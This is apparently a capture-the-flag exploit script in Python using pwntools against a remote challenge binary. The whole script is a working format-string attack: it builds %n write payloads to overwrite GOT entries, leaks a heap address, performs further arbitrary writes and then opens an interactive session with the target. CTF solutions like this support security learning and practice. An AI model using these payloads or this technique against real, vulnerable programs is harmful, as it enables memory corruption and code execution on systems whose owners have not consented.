#!/usr/bin/env python3
from pwn import *

target = remote("tjc.tf", 31764)
#target = process("./chall")
elf = ELF("chall")
#gdb.attach(target, gdbscript="b printf")
#gdb.attach(target)

got = p32(0x4033c8)
#print(hex(got))
#0x401036 -> 0x401372  b"%882x"
#8~13までが入力範囲
"""
write_got = b"%19x.%8$x.%9$x.%10$x.%11$x.%12$x.%13$x"
target.recvuntil("give me a string (or else): ")
payload = b"%114x" + b"%11$n" + b"%16289x" + b"%12$n" + b"..%4x"
payload += b"\x00" * (0x28 - len(payload))
payload += p32(0x4033c8) + p32(0) + p32(0x4033c9) + p32(0)
target.sendline(payload)
"""
#0x4031b8
#0x401329
target.recvuntil("give me a string (or else): ")
payload = b"%41x" + b"%11$n" + b"%16362x" + b"%12$n" + b"..%4x"
payload += b"\x00" * (0x28 - len(payload))
payload += p32(0x4031b8) + p32(0) + p32(0x4031b9) + p32(0)
target.sendline(payload)

target.recvuntil("..")
#-0x59
string = "0x" + str(target.recv(7))[2:-1]
heap = int(string, 16) - 0x59 + 0x1210
print(hex(heap))
# +0x1210

#3c -> 69 -> 86a
payload2 = b"%60x" + b"%10$n" + b"%45x" + b"%11$n" + b"%2049x" + b"%12$n"
payload2 += b"\x00" * 3
payload2 += p32(heap) + p32(0) + p32(heap + 1) + p32(0) + p32(heap + 2) + p32(0)
target.sendline(payload2)

target.interactive()